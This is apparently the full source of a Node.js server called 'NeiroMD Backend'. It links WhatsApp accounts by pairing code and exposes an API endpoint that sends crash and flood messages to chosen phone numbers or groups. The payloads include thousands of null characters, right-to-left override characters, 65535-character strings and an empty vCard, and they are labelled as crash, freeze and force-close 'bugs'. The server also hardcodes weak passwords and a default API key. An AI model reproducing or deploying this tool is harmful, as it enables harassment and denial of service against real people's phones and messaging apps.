/**
 * NeiroMD Backend - Pairing Code System
 * Install: npm install
 * Run: node server.js
 */

const express = require('express')
const cors    = require('cors')
const path    = require('path')
const fs      = require('fs')

// Fix crypto Node.js 18
const nodeCrypto = require('crypto')
if (typeof globalThis.crypto === 'undefined') {
  try {
    globalThis.crypto = nodeCrypto.webcrypto
  } catch(e) {
    globalThis.crypto = { getRandomValues: (arr) => { nodeCrypto.randomFillSync(arr); return arr } }
  }
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
} = require('ourin')

const pino = require('pino')

const app = express()
app.use(cors({ origin: '*', methods: ['GET','POST','DELETE','OPTIONS'], allowedHeaders: ['Content-Type','x-api-key'] }))
app.options('*', cors())
app.use(express.json())

// Serve dashboard HTML
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'NeiroMD.html')))

// ─── CONFIG ───────────────────────────────────────────────────────────────────
const PORT         = process.env.PORT    || 3001
const SESSIONS_DIR = process.env.SESS    || '/tmp/sessions'
const API_KEY      = process.env.API_KEY || 'neiromd_rahasia'

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true })

// ─── USERS ────────────────────────────────────────────────────────────────────
const USERS = [
  { username: 'neiromd', password: 'admin123', role: 'OWNER', expDate: '2053-07-15' },
  { username: 'user1',   password: 'user123',  role: 'ADMIN', expDate: '2025-12-31' },
]

// ─── SESSIONS MAP ─────────────────────────────────────────────────────────────
const sessions = new Map()

// ─── HELPERS ──────────────────────────────────────────────────────────────────
function fmtNum(num) {
  let n = num.replace(/[^0-9]/g, '')
  if (n.startsWith('0')) n = '62' + n.slice(1)
  if (!n.startsWith('62')) n = '62' + n
  return n
}

function auth(req, res, next) {
  if (req.headers['x-api-key'] !== API_KEY)
    return res.status(401).json({ success: false, message: 'Unauthorized' })
  next()
}

// ─── CREATE SESSION + PAIRING CODE ───────────────────────────────────────────
async function createSession(number) {
  const num      = fmtNum(number)
  const sessPath = path.join(SESSIONS_DIR, num)

  const existing = sessions.get(num)
  if (existing) {
    if (existing.status === 'connected')
      return { success: true, status: 'already_connected', number: num }
    if (existing.status === 'pairing' && existing.pairingCode)
      return { success: true, status: 'pairing', pairingCode: existing.pairingCode, number: num }
    sessions.delete(num)
  }

  if (!fs.existsSync(sessPath)) fs.mkdirSync(sessPath, { recursive: true })

  const { state, saveCreds } = await useMultiFileAuthState(sessPath)
  const { version }          = await fetchLatestBaileysVersion()

  const sock = makeWASocket({
    version,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
    },
    printQRInTerminal: false,
    logger: pino({ level: 'silent' }),
    browser: ['Ubuntu', 'Chrome', '20.0.0'],
    markOnlineOnConnect: false,
  })

  const sessData = { sock, status: 'connecting', pairingCode: null, number: num }
  sessions.set(num, sessData)

  // Request pairing code OURINNAI
  let pairingCode = null
  try {
    await new Promise(r => setTimeout(r, 3000))
    const phoneNum = num.replace(/[^0-9]/g, '')
    pairingCode          = await sock.requestPairingCode(phoneNum, 'OURINNAI')
    sessData.status      = 'pairing'
    sessData.pairingCode = pairingCode || 'OURINNAI'
    console.log(`[PAIRING] ${phoneNum} → ${pairingCode}`)
  } catch (e) {
    console.error(`[PAIRING ERROR] ${num}:`, e.message)
    sessData.status = 'error'
    sessions.delete(num)
    fs.rmSync(sessPath, { recursive: true, force: true })
    return { success: false, message: 'Gagal generate pairing code: ' + e.message }
  }

  sock.ev.on('creds.update', saveCreds)

  sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      sessData.status      = 'connected'
      sessData.pairingCode = null
      console.log(`[CONNECTED] ${num}`)
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode
      const shouldReconnect = code !== DisconnectReason.loggedOut
      if (shouldReconnect) {
        sessData.status = 'reconnecting'
        setTimeout(() => createSession(num), 5000)
      } else {
        sessions.delete(num)
        fs.rmSync(sessPath, { recursive: true, force: true })
      }
    }
  })

  return { success: true, status: 'pairing', pairingCode: pairingCode || 'OURINNAI', number: num }
}

// ─── ROUTES ───────────────────────────────────────────────────────────────────

// Login
app.post('/api/login', (req, res) => {
  const { username, password } = req.body
  if (!username || !password)
    return res.status(400).json({ success: false, message: 'Username & password wajib' })
  const user = USERS.find(u => u.username.toLowerCase() === username.toLowerCase())
  if (!user || user.password !== password)
    return res.status(401).json({ success: false, message: 'Username atau password salah' })
  if (new Date(user.expDate) < new Date())
    return res.status(403).json({ success: false, message: 'Akun expired' })
  const token = Buffer.from(`${user.username}:${Date.now()}`).toString('base64')
  res.json({ success: true, token, apiKey: API_KEY, user: { username: user.username, role: user.role, expDate: user.expDate } })
})

// Ping
app.get('/api/ping', (req, res) => {
  res.json({ success: true, status: 'ONLINE', sessions: sessions.size, uptime: process.uptime() })
})

// Request pairing code
app.post('/api/pairing/request', auth, async (req, res) => {
  const { number } = req.body
  if (!number) return res.status(400).json({ success: false, message: 'Nomor wajib' })
  const result = await createSession(number)
  res.json(result)
})

// Cek status sesi
app.get('/api/pairing/status/:number', auth, (req, res) => {
  const num  = fmtNum(req.params.number)
  const sess = sessions.get(num)
  if (!sess) return res.json({ success: true, status: 'not_found', number: num })
  res.json({
    success: true,
    status: sess.status,
    number: num,
    pairingCode: sess.status === 'pairing' ? sess.pairingCode : null,
  })
})

// Kirim bug
app.post('/api/bug/send', auth, async (req, res) => {
  const { sender, target, bugType, type } = req.body
  if (!sender || !target || !bugType)
    return res.status(400).json({ success: false, message: 'sender, target, bugType wajib' })

  const num  = fmtNum(sender)
  const sess = sessions.get(num)

  if (!sess)
    return res.status(404).json({ success: false, message: `Sesi ${num} tidak ditemukan. Pairing dulu.` })
  if (sess.status !== 'connected')
    return res.status(400).json({ success: false, message: `Sesi ${num} belum connected (status: ${sess.status})` })

  const sock = sess.sock

  try {
    let jid
    if (type === 'group') {
      const code = target.split('chat.whatsapp.com/')[1]
      if (!code) throw new Error('Format link grup tidak valid')
      const info = await sock.groupGetInviteInfo(code)
      jid = info.id
    } else {
      jid = fmtNum(target) + '@s.whatsapp.net'
    }

    // ── GANTI DENGAN FUNGSI BUG LU ──────────────────────────────────────────
    switch (bugType) {
      case 'CRASH NOTIF':
        await sock.sendMessage(jid, { text: '\u0000'.repeat(3000) })
        break
      case 'INVISIBLE FC IOS':
        await sock.sendMessage(jid, {
          contacts: { displayName: ' ', contacts: [{ vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:\nEND:VCARD' }] }
        })
        break
      case 'DELAY':
        for (let i = 0; i < 5; i++) {
          await sock.sendMessage(jid, { text: ' '.repeat(65536) })
          await new Promise(r => setTimeout(r, 300))
        }
        break
      case 'FORCE UI CLOSE':
        await sock.sendMessage(jid, { text: '\u202E'.repeat(5000) })
        break
      case 'CRSH CLIK DAN NO CLIK':
        await sock.sendMessage(jid, { text: 'x'.repeat(65535) })
        break
      case 'KILL GB AJG':
        await sock.sendMessage(jid, { text: '\u0000'.repeat(65535) })
        break
      default:
        await sock.sendMessage(jid, { text: bugType })
    }
    // ── END BUG ─────────────────────────────────────────────────────────────

    res.json({
      success: true,
      message: `Bug "${bugType}" berhasil dikirim dari ${num} ke ${target}`,
      sender: num, target, bugType,
      timestamp: new Date().toISOString()
    })
  } catch (e) {
    console.error('[BUG ERROR]', e.message)
    res.status(500).json({ success: false, message: 'Gagal: ' + e.message })
  }
})

// List sesi
app.get('/api/sessions', auth, (req, res) => {
  const list = []
  for (const [num, sess] of sessions.entries())
    list.push({ number: num, status: sess.status })
  res.json({ success: true, sessions: list })
})

// Hapus sesi
app.delete('/api/session/:number', auth, async (req, res) => {
  const num  = fmtNum(req.params.number)
  const sess = sessions.get(num)
  if (!sess) return res.status(404).json({ success: false, message: 'Sesi tidak ditemukan' })
  try { await sess.sock.logout() } catch (e) {}
  sessions.delete(num)
  fs.rmSync(path.join(SESSIONS_DIR, num), { recursive: true, force: true })
  res.json({ success: true, message: `Sesi ${num} dihapus` })
})

// ─── RESTORE SESI TERSIMPAN ───────────────────────────────────────────────────
async function restoreSessions() {
  if (!fs.existsSync(SESSIONS_DIR)) return
  const dirs = fs.readdirSync(SESSIONS_DIR)
    .filter(f => fs.statSync(path.join(SESSIONS_DIR, f)).isDirectory())
  if (dirs.length === 0) return
  console.log(`[RESTORE] Memulihkan ${dirs.length} sesi...`)
  for (const num of dirs) {
    await createSession(num).catch(e => console.error(`[RESTORE FAIL] ${num}:`, e.message))
    await new Promise(r => setTimeout(r, 1000))
  }
}

// ─── START ────────────────────────────────────────────────────────────────────
app.listen(PORT, async () => {
  console.log(`\n╔════════════════════════════════════╗`)
  console.log(`║  NeiroMD Backend  •  Port ${PORT}     ║`)
  console.log(`╚════════════════════════════════════╝`)
  console.log(`\n  API_KEY : ${API_KEY}\n`)
  await restoreSessions()
})
